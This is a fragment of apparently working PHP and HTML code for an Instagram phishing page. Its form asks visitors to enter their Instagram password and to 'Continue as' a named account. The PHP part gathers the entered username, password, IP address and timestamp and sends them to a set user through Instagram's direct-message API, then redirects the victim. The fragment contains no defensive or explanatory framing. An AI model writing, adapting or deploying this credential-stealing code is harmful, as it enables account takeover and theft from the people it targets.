...
$yazı = "Username: ".$lparalyzed."\n\n" ."Password: ".$password. "\n\n"."Ip Adress: ".$uke."\n\n". "Time: ".$cur_time. "\n\n\n";
$ig->direct->sendText(['users' => ["$userid"]], $yazı);

header("location: password.php?nick=".$lparalyzed);
}
?>
...
Please write your instagram password and click 'Continue as @$lparalyzed' and fill the next form.";
		...
		<?php 
	    if($lparalyzed){
	        echo "<hr> <form action='login.php'>
		    <button type='submit' class='qenzyist' style='width:240px;height:24px;'>Arent you $lparalyzed
</button>
